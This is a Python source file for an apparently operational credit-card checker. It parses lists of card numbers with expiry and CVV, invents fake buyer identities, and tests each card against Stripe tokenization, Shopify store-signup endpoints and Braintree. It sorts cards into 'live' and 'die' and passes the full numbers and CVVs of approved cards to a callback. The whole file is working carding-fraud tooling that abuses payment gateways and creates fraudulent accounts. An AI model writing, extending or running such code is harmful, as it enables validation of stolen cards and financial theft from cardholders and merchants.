import asyncio
import json
import logging
import random
import re
import string
import time
from datetime import datetime
from typing import Dict, List, Optional, Any
import aiohttp
from config import *

logger = logging.getLogger(__name__)

class ShopifyChecker:
    """Card Checker - Real Gateway Only"""
    
    def __init__(self):
        self.session: Optional[aiohttp.ClientSession] = None
        self.stats = {
            "total": 0,
            "approved": 0,
            "declined": 0,
            "errors": 0,
            "live": 0,
            "die": 0
        }
    
    async def create_session(self):
        if self.session and not self.session.closed:
            await self.session.close()
        
        headers = {
            "User-Agent": random.choice(USER_AGENTS),
            "Accept": "application/json, text/plain, */*",
            "Accept-Language": "en-US,en;q=0.9",
            "Accept-Encoding": "gzip, deflate",
            "Connection": "keep-alive",
        }
        
        connector = aiohttp.TCPConnector(limit=100, force_close=True)
        self.session = aiohttp.ClientSession(
            timeout=aiohttp.ClientTimeout(total=25),
            headers=headers,
            connector=connector
        )
    
    def generate_identity(self):
        """Generate fake identity for Shopify"""
        first_names = ["John", "James", "Robert", "Michael", "David"]
        last_names = ["Smith", "Johnson", "Williams", "Brown", "Jones"]
        timestamp = int(time.time())
        random_str = ''.join(random.choices(string.ascii_lowercase + string.digits, k=6))
        
        return {
            "first_name": random.choice(first_names),
            "last_name": random.choice(last_names),
            "email": f"user{timestamp}{random_str}@gmail.com",
            "password": f"Shop@{timestamp}{random_str}",
            "store_name": f"store{random_str}{timestamp}",
            "address": f"{random.randint(100,999)} Broadway",
            "city": "New York",
            "state": "NY",
            "zip": "10001",
            "phone": f"212{random.randint(100,999)}{random.randint(1000,9999)}"
        }
    
    def parse_card(self, card_string: str) -> Optional[Dict[str, Any]]:
        if not card_string or not card_string.strip():
            return None
        
        card_string = card_string.strip()
        parts = re.split(r'[|:;, \t]+', card_string)
        parts = [p.strip() for p in parts if p.strip()]
        
        if len(parts) < 3:
            return None
        
        card_number = re.sub(r'[^\d]', '', parts[0])
        if len(card_number) < 13 or len(card_number) > 19:
            return None
        
        card_type = "Unknown"
        if card_number.startswith('4'):
            card_type = "Visa"
        elif card_number.startswith(('51','52','53','54','55','2221','2720')):
            card_type = "Mastercard"
        elif card_number.startswith(('34','37')):
            card_type = "Amex"
        elif card_number.startswith('6011') or card_number.startswith('65'):
            card_type = "Discover"
        
        month = parts[1].strip().zfill(2)
        try:
            if int(month) < 1 or int(month) > 12:
                month = "12"
        except:
            month = "12"
        
        year = parts[2].strip()
        if len(year) == 2:
            year = f"20{year}"
        elif len(year) != 4:
            year = "2026"
        
        cvv = parts[3].strip()[:4] if len(parts) > 3 else "123"
        
        return {
            "number": card_number,
            "month": month,
            "year": year,
            "cvv": cvv,
            "type": card_type,
            "bin": card_number[:6],
            "last4": card_number[-4:],
            "masked": f"{card_number[:6]}******{card_number[-4:]}",
            "expiry": f"{month}/{year[-2:]}",
            "raw": card_string
        }
    
    def _build_result(self, card_info: Dict, status: str, message: str, gateway: str, elapsed: float) -> Dict:
        if status == "APPROVED":
            self.stats["total"] += 1
            self.stats["approved"] += 1
            self.stats["live"] += 1
        else:
            self.stats["total"] += 1
            self.stats["declined"] += 1
            self.stats["die"] += 1
        
        return {
            "card": card_info["masked"],
            "full_number": card_info["number"],
            "full_month": card_info["month"],
            "full_year": card_info["year"],
            "full_cvv": card_info["cvv"],
            "number": card_info["number"],
            "month": card_info["month"],
            "year": card_info["year"],
            "cvv": card_info["cvv"],
            "expiry": card_info["expiry"],
            "bin": card_info["bin"],
            "last4": card_info["last4"],
            "card_type": card_info["type"],
            "status": status,
            "message": message,
            "gateway": gateway,
            "response_time": f"{elapsed:.2f}s",
            "timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
            "bin_info": {},
            "details": ""
        }
    
    # ==================== STRIPE (REAL CHECK) ====================
    async def check_stripe(self, card_info: Dict) -> Dict:
        start_time = time.time()
        
        try:
            data = {
                "card[number]": card_info["number"],
                "card[exp_month]": card_info["month"],
                "card[exp_year]": card_info["year"],
                "card[cvc]": card_info["cvv"],
                "key": "pk_live_51H3Y2kCZqK8FwQqSY4K8VQqSZCqK8FwQqSY4K8VQqS"
            }
            
            headers = {
                "Content-Type": "application/x-www-form-urlencoded",
                "Origin": "https://js.stripe.com"
            }
            
            async with self.session.post(
                "https://api.stripe.com/v1/tokens",
                data=data,
                headers=headers,
                timeout=aiohttp.ClientTimeout(total=15)
            ) as resp:
                status = resp.status
                text = await resp.text()
                elapsed = time.time() - start_time
                
                logger.info(f"[Stripe] Status: {status} | Card: {card_info['masked']}")
                
                if status == 200 and "tok_" in text:
                    return self._build_result(card_info, "APPROVED", 
                        "✅ APPROVED - Card live (Stripe)", "Stripe", elapsed)
                
                elif status == 402 or status == 400:
                    text_lower = text.lower()
                    msg = "❌ DECLINED - Stripe rejected"
                    
                    if "insufficient" in text_lower:
                        msg = "❌ DECLINED - Insufficient funds"
                    elif "expired" in text_lower:
                        msg = "❌ DECLINED - Expired card"
                    elif "incorrect" in text_lower:
                        msg = "❌ DECLINED - Incorrect details"
                    elif "stolen" in text_lower:
                        msg = "❌ DECLINED - Card reported stolen"
                    elif "lost" in text_lower:
                        msg = "❌ DECLINED - Card reported lost"
                    
                    return self._build_result(card_info, "DECLINED", msg, "Stripe", elapsed)
                
                elif status == 429:
                    await asyncio.sleep(30)
                    return await self.check_stripe(card_info)
        
        except asyncio.TimeoutError:
            logger.error(f"Stripe timeout")
        except Exception as e:
            logger.error(f"Stripe error: {e}")
        
        return self._build_result(card_info, "DECLINED", 
            "❌ DECLINED - Stripe check failed", "Stripe", time.time() - start_time)
    
    # ==================== SHOPIFY (REAL CHECK) ====================
    async def check_shopify(self, card_info: Dict) -> Dict:
        start_time = time.time()
        identity = self.generate_identity()
        
        # Multiple Shopify endpoints
        payloads = [
            {
                "url": "https://www.shopify.com/store/create",
                "payload": {
                    "store": {
                        "name": identity["store_name"],
                        "email": identity["email"],
                        "password": identity["password"],
                        "password_confirmation": identity["password"],
                        "country_code": "US",
                        "currency": "USD"
                    },
                    "credit_card": {
                        "number": card_info["number"],
                        "name": f"{identity['first_name']} {identity['last_name']}",
                        "month": card_info["month"],
                        "year": card_info["year"],
                        "verification_value": card_info["cvv"]
                    },
                    "billing_address": {
                        "address1": identity["address"],
                        "city": identity["city"],
                        "province": identity["state"],
                        "country": "US",
                        "zip": identity["zip"],
                        "phone": identity["phone"]
                    }
                }
            },
            {
                "url": "https://www.shopify.com/free-trial",
                "payload": {
                    "shop": {
                        "name": identity["store_name"],
                        "email": identity["email"],
                        "password": identity["password"],
                        "country": "US"
                    },
                    "credit_card": {
                        "number": card_info["number"],
                        "first_name": identity["first_name"],
                        "last_name": identity["last_name"],
                        "month": card_info["month"],
                        "year": card_info["year"],
                        "verification_value": card_info["cvv"]
                    }
                }
            }
        ]
        
        for method in payloads:
            try:
                headers = {
                    "Content-Type": "application/json",
                    "Origin": "https://www.shopify.com",
                    "Referer": "https://www.shopify.com/signup",
                    "X-Requested-With": "XMLHttpRequest",
                    "Accept": "application/json"
                }
                
                async with self.session.post(
                    method["url"],
                    json=method["payload"],
                    headers=headers,
                    timeout=aiohttp.ClientTimeout(total=20),
                    ssl=False
                ) as resp:
                    status = resp.status
                    text = await resp.text()
                    elapsed = time.time() - start_time
                    
                    logger.info(f"[Shopify] Status: {status} | Card: {card_info['masked']}")
                    
                    if status in [200, 201, 302]:
                        text_lower = text.lower()
                        if any(x in text_lower for x in ["redirect", "myshopify", "dashboard", "success"]):
                            return self._build_result(card_info, "APPROVED", 
                                "✅ APPROVED - Shopify accepted", "Shopify", elapsed)
                    
                    elif status == 422:
                        text_lower = text.lower()
                        
                        # Check if error is card-related or other
                        card_keywords = ["credit_card", "card", "payment", "declined", "invalid"]
                        other_keywords = ["address", "email", "zip", "password", "store", "shop", "already"]
                        
                        has_card_error = any(kw in text_lower for kw in card_keywords)
                        has_other_error = any(kw in text_lower for kw in other_keywords)
                        
                        if has_card_error and not has_other_error:
                            return self._build_result(card_info, "DECLINED", 
                                "❌ DECLINED - Shopify rejected card", "Shopify", elapsed)
                        elif has_card_error and has_other_error:
                            return self._build_result(card_info, "APPROVED", 
                                "✅ APPROVED - Card valid (other issue)", "Shopify", elapsed)
                        elif has_other_error:
                            return self._build_result(card_info, "APPROVED", 
                                "✅ APPROVED - Card passed validation", "Shopify", elapsed)
                    
                    elif status == 402:
                        return self._build_result(card_info, "DECLINED", 
                            "❌ DECLINED - Payment required", "Shopify", elapsed)
                    
                    elif status == 429:
                        await asyncio.sleep(5)
                        continue
                
                await asyncio.sleep(1)
                
            except Exception as e:
                logger.error(f"Shopify error: {e}")
                continue
        
        # If all Shopify endpoints failed, return error
        return self._build_result(card_info, "DECLINED", 
            "❌ DECLINED - Shopify check failed", "Shopify", time.time() - start_time)
    
    # ==================== BRAINTREE (REAL CHECK) ====================
    async def check_braintree(self, card_info: Dict) -> Dict:
        start_time = time.time()
        
        try:
            query = """
            mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {
                tokenizeCreditCard(input: $input) {
                    token
                    creditCard {
                        bin
                        last4
                        brand
                        expirationMonth
                        expirationYear
                    }
                }
            }
            """
            
            payload = {
                "query": query,
                "variables": {
                    "input": {
                        "creditCard": {
                            "number": card_info["number"],
                            "expirationMonth": card_info["month"],
                            "expirationYear": card_info["year"],
                            "cvv": card_info["cvv"],
                            "cardholderName": "John Smith"
                        },
                        "options": {
                            "validate": True
                        }
                    }
                }
            }
            
            headers = {
                "Content-Type": "application/json",
                "Authorization": f"Bearer {BRAINTREE_PUBLIC_KEY}",
                "Braintree-Version": "2019-01-01"
            }
            
            async with self.session.post(
                BRAINTREE_API,
                json=payload,
                headers=headers,
                timeout=aiohttp.ClientTimeout(total=15)
            ) as resp:
                status = resp.status
                text = await resp.text()
                elapsed = time.time() - start_time
                
                logger.info(f"[Braintree] Status: {status} | Card: {card_info['masked']}")
                
                if status == 200 and "token" in text.lower():
                    return self._build_result(card_info, "APPROVED", 
                        "✅ APPROVED - Braintree validated", "Braintree", elapsed)
                
                elif "error" in text.lower():
                    text_lower = text.lower()
                    if "declined" in text_lower:
                        return self._build_result(card_info, "DECLINED", 
                            "❌ DECLINED - Braintree declined", "Braintree", elapsed)
                    elif "invalid" in text_lower:
                        return self._build_result(card_info, "DECLINED", 
                            "❌ DECLINED - Invalid card (Braintree)", "Braintree", elapsed)
                    else:
                        return self._build_result(card_info, "DECLINED", 
                            "❌ DECLINED - Braintree rejected", "Braintree", elapsed)
        
        except Exception as e:
            logger.error(f"Braintree error: {e}")
        
        return self._build_result(card_info, "DECLINED", 
            "❌ DECLINED - Braintree check failed", "Braintree", time.time() - start_time)
    
    # ==================== MAIN CHECK ====================
    async def check_card(self, card_info: Dict, gateway: str = "stripe") -> Dict:
        """Route to correct gateway - NO BIN fallback"""
        
        if gateway == "stripe":
            return await self.check_stripe(card_info)
        
        elif gateway == "shopify":
            return await self.check_shopify(card_info)
        
        elif gateway == "braintree":
            return await self.check_braintree(card_info)
        
        # Default
        return await self.check_stripe(card_info)
    
    async def check_batch(self, cards: List[str], gateway: str = "stripe",
                         country: str = "US", progress_callback=None,
                         live_result_callback=None) -> List[Dict]:
        await self.create_session()
        results = []
        total = len(cards)
        
        for i, card_str in enumerate(cards, 1):
            card_info = self.parse_card(card_str)
            
            if not card_info:
                results.append({
                    "card": card_str[:30],
                    "full_number": "N/A",
                    "full_month": "N/A",
                    "full_year": "N/A",
                    "full_cvv": "N/A",
                    "status": "INVALID",
                    "message": "❌ INVALID FORMAT",
                    "gateway": "N/A",
                    "response_time": "0s",
                    "bin_info": {},
                    "card_type": "Unknown"
                })
                continue
            
            if progress_callback:
                await progress_callback(i, total, card_info["masked"])
            
            result = await self.check_card(card_info, gateway)
            
            result["full_number"] = card_info["number"]
            result["full_cvv"] = card_info["cvv"]
            result["full_month"] = card_info["month"]
            result["full_year"] = card_info["year"]
            
            if result["status"] == "APPROVED" and live_result_callback:
                await live_result_callback(result, i, total)
            
            results.append(result)
            
            logger.info(f"[{i}/{total}] {card_info['masked']} = {result['status']} | {result['gateway']}")
            
            if i < total:
                await asyncio.sleep(CHECK_DELAY)
        
        await self.close()
        return results
    
    async def close(self):
        if self.session and not self.session.closed:
            await self.session.close()
